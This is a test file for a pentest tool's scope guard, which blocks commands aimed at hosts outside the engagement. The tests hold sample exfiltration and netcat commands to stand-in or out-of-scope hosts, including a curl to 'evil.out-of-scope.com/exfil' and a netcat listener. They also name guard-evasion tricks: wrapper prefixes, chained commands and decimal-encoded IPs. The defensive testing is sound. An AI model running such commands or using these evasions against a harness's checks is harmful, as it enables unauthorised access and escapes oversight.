// ============================================================
// Scope guard — implicit target extraction.
//
// _process-runner sniffs implicit targets from the FULL command whenever the
// action is target-facing or invokes a network-capable binary — detected
// across every shell segment and behind any wrapper prefix, not just from the
// first command token — and merges them into the per-target scope validation
// set. This pins the unified behavior and the three bypasses it closes:
//   H-9  wrapper prefix          (proxychains|sudo|timeout … nmap 10/8)
//   H-10 compound command        (echo ok; curl https://evil/…)
//   H-11 one in-scope target     suppressing the check of OTHER embedded hosts
// ============================================================

import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdtempSync, rmSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { GraphEngine as BaseGraphEngine } from '../services/graph-engine.js';
import { runInstrumentedProcess } from '../tools/_process-runner.js';
import type { EngagementConfig } from '../types.js';

// Unique paths per test so the async state persist of one test cannot race the
// cleanup of the next (the shared-file ENOENT flake under parallel runs).
let testIdx = 0;
let TEST_ID = 'test-target-guard-0';
let TEST_STATE_FILE = '';
let testDir = '';
const engines = new Set<BaseGraphEngine>();

class GraphEngine extends BaseGraphEngine {
  constructor(config: EngagementConfig, stateFilePath?: string, configFilePath?: string) {
    super(config, stateFilePath, configFilePath);
    engines.add(this);
  }
}

function freshPaths(): void {
  testIdx += 1;
  TEST_ID = `test-target-guard-${testIdx}`;
  testDir = mkdtempSync(join(tmpdir(), `overwatch-target-guard-${testIdx}-`));
  TEST_STATE_FILE = join(testDir, 'state.json');
}

function makeConfig(): EngagementConfig {
  return {
    id: TEST_ID,
    name: 'target-guard',
    created_at: new Date().toISOString(),
    scope: { cidrs: ['10.10.10.0/24', '10.10.110.0/24'], domains: ['lab.local'], exclusions: ['10.10.110.2'] },
    objectives: [],
    opsec: { name: 'pentest', max_noise: 1 },
  };
}

function cleanup(): void {
  for (const engine of engines) engine.dispose();
  engines.clear();
  if (testDir) rmSync(testDir, { recursive: true, force: true });
  testDir = '';
  TEST_STATE_FILE = '';
}

describe('Scope guard — implicit target extraction', () => {
  beforeEach(() => {
    cleanup();
    freshPaths();
  });
  afterEach(cleanup);

  it('scope-blocks an out-of-scope URL in argv even under a non-target-facing technique', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'curl',
      args: ['https://target.example.com/admin'],
      command_repr: 'curl https://target.example.com/admin',
      technique: 'note', // not in TARGET_FACING_TECHNIQUES — curl is network-capable
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    const payload = JSON.parse(res.content[0].text);
    expect(payload.executed).toBe(false);
    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
    expect((payload.errors || []).join(' ')).toMatch(/target\.example\.com/);
  });

  it('does NOT treat a curl -c/-b cookie-jar file path as an implicit target host', async () => {
    // Regression: a `session_jar_id` login spawns `curl -c <jar> -b <jar> <url>`.
    // The jar path (session-jars/sess-1.jar) must NOT be scope-scanned as a host,
    // else every jar login is refused as out-of-scope. Use an out-of-scope URL so
    // validation fails on the URL (no real curl spawn) and assert the ONLY flagged
    // host is the URL — never the jar filename.
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'curl',
      args: ['-c', './session-jars/sess-1.jar', '-b', './session-jars/sess-1.jar', 'https://evil.example.com/'],
      command_repr: 'curl -c ./session-jars/sess-1.jar -b ./session-jars/sess-1.jar https://evil.example.com/',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    const payload = JSON.parse(res.content[0].text);
    const errs = (payload.errors || []).join(' ');
    expect(errs).toMatch(/evil\.example\.com/); // the URL is still scope-checked
    expect(errs).not.toMatch(/sess-1\.jar/);    // the jar path is NOT
    expect(errs).not.toMatch(/session-jars/);
  });

  it('scope-blocks an out-of-scope IP passed to a network-capable binary', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nc',
      args: ['9.9.9.9', '443'],
      command_repr: 'nc 9.9.9.9 443',
      technique: 'research',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    const payload = JSON.parse(res.content[0].text);
    expect((payload.errors || []).join(' ')).toMatch(/9\.9\.9\.9/);
    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
  });

  it('does not fire on shell-only binaries that mention IPs/URLs in argv (echo, cat, …)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'echo',
      args: ['note: target was 9.9.9.9'],
      command_repr: 'echo "note: target was 9.9.9.9"',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBeFalsy();
    const payload = JSON.parse(res.content[0].text);
    expect(payload.executed).not.toBe(false);
  });

  it('lets target-facing techniques continue through implicit extraction (out-of-scope IP blocked)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'echo',
      args: ['9.9.9.9'],
      command_repr: 'echo 9.9.9.9',
      technique: 'recon', // IS target-facing
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    const payload = JSON.parse(res.content[0].text);
    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
  });

  it('honors allow_unverified_scope for shell-only commands that reference URLs', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'echo',
      args: ['hello https://anywhere.example/'],
      command_repr: 'echo hello https://anywhere.example/',
      technique: 'note',
      allow_unverified_scope: true,
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBeFalsy();
    const payload = JSON.parse(res.content[0].text);
    expect(payload.executed).not.toBe(false);
  });

  it('validates nmap CIDR targets without treating the network address or --exclude values as host targets', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nmap',
      args: ['-oX', '-', '10.10.110.0/24', '--exclude', '10.10.110.2'],
      command_repr: 'nmap -oX - 10.10.110.0/24 --exclude 10.10.110.2',
      technique: 'host_discovery',
      invoking_tool: 'run_tool',
      timeout_ms: 100,
    });
    const validation = engine.getFullHistory().find(e => e.event_type === 'action_validated');
    expect(validation?.target_cidrs).toEqual(['10.10.110.0/24']);
    const payload = JSON.parse(res.content[0].text);
    expect((payload.errors || []).join(' ')).not.toMatch(/10\.10\.110\.0\/24|10\.10\.110\.2/);
  });

  it('allows local operator infrastructure commands without broad unverified-scope override', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'bash',
      args: ['-c', 'echo bridge 10.10.14.22:4444 to 127.0.0.1:4445'],
      command_repr: 'echo bridge 10.10.14.22:4444 to 127.0.0.1:4445',
      technique: 'note',
      operator_infra: true,
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBeFalsy();
    const started = engine.getFullHistory().find(e => e.event_type === 'action_started');
    expect(started?.details).toMatchObject({ operator_infra: true });
  });

  // ---- H-9: wrapper prefix must not hide the wrapped binary ----
  it('H-9: blocks an out-of-scope scan hidden behind a wrapper prefix (proxychains)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'proxychains',
      args: ['nmap', '10.0.0.0/8'],
      command_repr: 'proxychains nmap 10.0.0.0/8',
      technique: 'note', // non-target-facing label — the nmap token must still be classified
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    const payload = JSON.parse(res.content[0].text);
    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
    expect((payload.errors || []).join(' ')).toMatch(/10\.0\.0\.0\/8/);
  });

  it('H-9: blocks an out-of-scope host behind a timeout wrapper', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'timeout',
      args: ['30', 'curl', 'https://evil.out-of-scope.com/x'],
      command_repr: 'timeout 30 curl https://evil.out-of-scope.com/x',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
  });

  // ---- H-10: compound command must not be classified by a benign first token ----
  it('H-10: blocks an out-of-scope egress in a later compound-command segment', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'bash',
      args: ['-c', 'echo start; curl https://evil.out-of-scope.com/exfil'],
      command_repr: 'echo start; curl https://evil.out-of-scope.com/exfil',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    const payload = JSON.parse(res.content[0].text);
    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
    expect((payload.errors || []).join(' ')).toMatch(/evil\.out-of-scope\.com/);
  });

  it('H-10: still runs a benign compound command with no network-capable binary', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'bash',
      args: ['-c', 'echo one; echo two'],
      command_repr: 'echo one; echo two',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBeFalsy();
    expect(JSON.parse(res.content[0].text).executed).not.toBe(false);
  });

  // ---- H-11: one in-scope target must not suppress checking OTHER embedded hosts ----
  it('H-11: an explicit in-scope target does not suppress an out-of-scope host in the same command', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nmap',
      args: ['10.10.10.5', '9.9.9.9'],
      command_repr: 'nmap 10.10.10.5 9.9.9.9',
      technique: 'port_scan',
      target_ips: ['10.10.10.5'], // one declared, in scope
      invoking_tool: 'run_tool',
      timeout_ms: 100,
    });
    expect(res.isError).toBe(true);
    const payload = JSON.parse(res.content[0].text);
    expect((payload.errors || []).join(' ')).toMatch(/9\.9\.9\.9/);
    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
  });

  it('H-11: a multi-target command entirely in scope still runs', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nmap',
      args: ['10.10.10.5', '10.10.110.9'],
      command_repr: 'nmap 10.10.10.5 10.10.110.9',
      technique: 'port_scan',
      target_ips: ['10.10.10.5'],
      invoking_tool: 'run_tool',
      timeout_ms: 100,
    });
    const payload = JSON.parse(res.content[0].text);
    expect((payload.errors || []).join(' ')).not.toMatch(/out of scope/i);
  });

  // ---- fail closed when a host operand can't be resolved to a scope target ----
  it('fails closed on a bare single-label host that extraction cannot resolve (ssh dc01)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'ssh',
      args: ['dc01'],
      command_repr: 'ssh dc01',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect(JSON.parse(res.content[0].text).errors.join(' ')).toMatch(/unresolved_target_without_scope/);
  });

  it('blocks a bare ::-collapsed IPv6 target (nc fe80::1)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nc',
      args: ['fe80::1', '9000'],
      command_repr: 'nc fe80::1 9000',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    // Either extracted + scope-checked, or the fail-closed backstop — both block.
    expect(JSON.parse(res.content[0].text).errors.join(' ')).toMatch(/out of scope|unresolved_target_without_scope/i);
  });

  it('blocks a numeric-encoded IP target (nc 3232235521 -> 192.168.0.1, out of scope)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nc',
      args: ['3232235521', '80'],
      command_repr: 'nc 3232235521 80',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    // Normalized to 192.168.0.1 and scope-checked, or fail-closed — both block.
    expect(JSON.parse(res.content[0].text).errors.join(' ')).toMatch(/out of scope|unresolved_target_without_scope/i);
  });

  it('blocks a decimal-encoded IP on a non-host-first binary (curl 3232235521)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'curl',
      args: ['3232235521'],
      command_repr: 'curl 3232235521',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
  });

  it('boolean nc -o does not swallow the following host (nc -o <out-of-scope-ip>)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nc',
      args: ['-o', '9.9.9.9', '4444'],
      command_repr: 'nc -o 9.9.9.9 4444',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/9\.9\.9\.9|out of scope/i);
  });

  it('nc -w timeout keeps the following host in scope check (nc -w 3 <out-of-scope-ip>)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nc',
      args: ['-w', '3', '9.9.9.9', '4444'],
      command_repr: 'nc -w 3 9.9.9.9 4444',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/9\.9\.9\.9|out of scope/i);
  });

  it('fabricated flag on telnet does not swallow the host (telnet -o <out-of-scope-ip>)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'telnet',
      args: ['-o', '9.9.9.9'],
      command_repr: 'telnet -o 9.9.9.9',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/9\.9\.9\.9|out of scope/i);
  });

  it('boolean nc -b does not swallow a bare-host operand', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nc',
      args: ['-b', 'dc01', '445'],
      command_repr: 'nc -b dc01 445',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/unresolved_target_without_scope|out of scope/i);
  });

  it('does not over-extract a `::` substring inside a URL path as a spurious IPv6 target', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    // host lab.local is in scope (domains: ['lab.local']); the a::b path fragment
    // must not be extracted as an out-of-scope IPv6 and block the request.
    const res = await runInstrumentedProcess(engine, {
      binary: 'curl',
      args: ['http://api.lab.local/a::b'],
      command_repr: 'curl http://api.lab.local/a::b',
      technique: 'note',
      invoking_tool: 'run_bash',
      timeout_ms: 100,
    });
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/out of scope/i);
  });

  it('honors allow_unverified_scope for a bare-host network command', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'ssh',
      args: ['dc01'],
      command_repr: 'ssh dc01',
      technique: 'note',
      allow_unverified_scope: true,
      invoking_tool: 'run_bash',
      timeout_ms: 100,
    });
    // Not blocked by the scope guard (may still fail to connect — that's fine).
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/unresolved_target_without_scope/);
  });

  it('does not fail closed on a flags-only network command (no host operand)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'curl',
      args: ['--version'],
      command_repr: 'curl --version',
      technique: 'note',
      invoking_tool: 'run_bash',
      timeout_ms: 2000,
    });
    expect(JSON.parse(res.content[0].text).errors?.join(' ') || '').not.toMatch(/unresolved_target_without_scope/);
  });

  // ---- no over-blocking of incidental host-like tokens when a target is declared ----
  it('does not scope-block an incidental script-filename token when an in-scope target is declared', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nmap',
      args: ['--script', 'http-enum.nse', '10.10.10.5'],
      command_repr: 'nmap --script http-enum.nse 10.10.10.5',
      technique: 'service_scan',
      target_ips: ['10.10.10.5'],
      invoking_tool: 'run_tool',
      timeout_ms: 100,
    });
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/out of scope/i);
  });

  it('does not scope-block an out-of-scope referer URL in an option value when the target is in scope', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'curl',
      args: ['-e', 'https://www.google.com/', 'http://10.10.10.5/'],
      command_repr: 'curl -e https://www.google.com/ http://10.10.10.5/',
      technique: 'note',
      target_ip: '10.10.10.5',
      invoking_tool: 'run_bash',
      timeout_ms: 100,
    });
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/google\.com|out of scope/i);
  });

  // ---- boolean-flag must NOT swallow the following target (fail-open guard) ----
  it('scope-blocks curl -s <out-of-scope-url> (boolean flag does not swallow the target)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'curl',
      args: ['-s', 'https://evil.out-of-scope.com/exfil'],
      command_repr: 'curl -s https://evil.out-of-scope.com/exfil',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
  });

  it('scope-blocks wget -c <out-of-scope-url>', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'wget',
      args: ['-c', 'https://evil.out-of-scope.com/x'],
      command_repr: 'wget -c https://evil.out-of-scope.com/x',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
  });

  it('scope-blocks an out-of-scope target carried by ldapsearch -H (binary-specific value flag)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'ldapsearch',
      args: ['-H', 'ldap://evil-dc.out-of-scope.com', '-b', 'dc=x'],
      command_repr: 'ldapsearch -H ldap://evil-dc.out-of-scope.com -b dc=x',
      technique: 'enum_ldap',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBe(true);
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
  });

  // ---- ssh identity/config value flags must not become the host ----
  it('does not fail closed on ssh -i keyfile when the host is in scope', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'ssh',
      args: ['-i', 'id_rsa', '10.10.10.5'],
      command_repr: 'ssh -i id_rsa 10.10.10.5',
      technique: 'note',
      invoking_tool: 'run_bash',
      timeout_ms: 100,
    });
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/unresolved_target_without_scope|out of scope/i);
  });

  // ---- host-first: only the first positional is the host (remote command allowed) ----
  it('does not fail closed on a remote command after an in-scope ssh host', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'ssh',
      args: ['10.10.10.5', 'whoami'],
      command_repr: 'ssh 10.10.10.5 whoami',
      technique: 'note',
      invoking_tool: 'run_bash',
      timeout_ms: 100,
    });
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/unresolved_target_without_scope/);
  });

  it('does not fail closed on a bare listener with no host operand (nc -lvnp 4444)', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'nc',
      args: ['-lvnp', '4444'],
      command_repr: 'nc -lvnp 4444',
      technique: 'note',
      invoking_tool: 'run_bash',
      timeout_ms: 100,
    });
    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/unresolved_target_without_scope/);
  });

  // ---- quote-aware segment split: a separator inside a quote is not a segment ----
  it('does not misclassify a benign echo whose quoted text contains "; ssh host"', async () => {
    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
    const res = await runInstrumentedProcess(engine, {
      binary: 'bash',
      args: ['-c', 'echo "reminder; ssh into jumpbox.corp.example.com later"'],
      command_repr: 'echo "reminder; ssh into jumpbox.corp.example.com later"',
      technique: 'note',
      invoking_tool: 'run_bash',
    });
    expect(res.isError).toBeFalsy();
    expect(JSON.parse(res.content[0].text).executed).not.toBe(false);
  });
});
